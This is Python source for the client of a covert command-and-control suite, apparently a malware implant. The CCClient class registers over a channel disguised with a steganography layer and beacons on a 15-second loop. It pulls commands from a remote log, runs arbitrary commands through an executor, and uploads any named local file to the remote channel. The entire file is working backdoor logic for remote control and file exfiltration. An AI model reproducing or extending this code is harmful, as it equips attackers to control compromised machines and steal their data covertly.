import os.path
import time

from ccsuite.ccchanel import ccchanel_log as cclog
from ccsuite.ccchanel.ccchanel_base import CCChanelBase
from ccsuite.ccchanel import ccchanel_messages as cpayload
from ccsuite.client.exec_base import CCClientExecBase
from ccsuite.client.id_base import CCClientIDBase
from ccsuite.steno.steno_base import CCStenoBase


class CCClient(object):
    def __init__(self,
                 ccchanel: CCChanelBase,
                 steno_: CCStenoBase,
                 executor: CCClientExecBase,
                 id_provider: CCClientIDBase):
        self.ccchanel = ccchanel
        self.steno_base = steno_
        self.id = id_provider.id()
        self.log_root = '/tmp/ccsuite'
        self.own_log = os.path.join(self.log_root, self.id)
        self.exit_flag = False
        self.executor = executor
        self.id_provider = id_provider

    def is_registered(self):
        return self.id in self.ccchanel.list(self.log_root)

    def register(self):
        cclog.log_init(self.ccchanel, self.steno_base, self.own_log)

    def tell_alive(self):
        cclog.log_append(self.ccchanel, self.steno_base, cpayload.message_create_alive(), self.own_log)

    def get_command(self):
        log = cclog.log_read(self.ccchanel, self.steno_base, self.own_log)
        dones = []
        for log_entry in reversed(log):
            if log_entry.get('done', False):
                dones += [log_entry['done']['id']]
            elif log_entry.get('command', False) and log_entry['command']['id'] not in dones:
                return log_entry.get('command')
        return None

    def execute_command(self, local_path, *args):
        if local_path == 'upload':
            local_file_path = args[0]
            remote_file_path = os.path.join(self.log_root, local_file_path.replace('/', '_'))
            print(f"CLIENT: executing upload {local_file_path}")
            self.ccchanel.write(local_file_path, remote_file_path)
            return f"file: {local_file_path} uploaded to {remote_file_path}".encode()
        else:
            return self.executor.exec(local_path, args)

    def log_append(self, payload):
        return cclog.log_append(self.ccchanel, self.steno_base, payload, self.own_log)

    def run(self):
        sleep_time = 15
        if not self.is_registered():
            self.register()
        self.tell_alive()
        while not self.exit_flag:
            cmd = self.get_command()
            if cmd is not None:
                cmd_id = cmd['id']
                exec_out = self.execute_command(cmd['kind'], *cmd['args']).decode()
                self.log_append(cpayload.message_create_done(cmd_id, exec_out))
            print(f"SLEEP {sleep_time}")
            time.sleep(sleep_time)
            self.log_append(cpayload.message_create_ping())
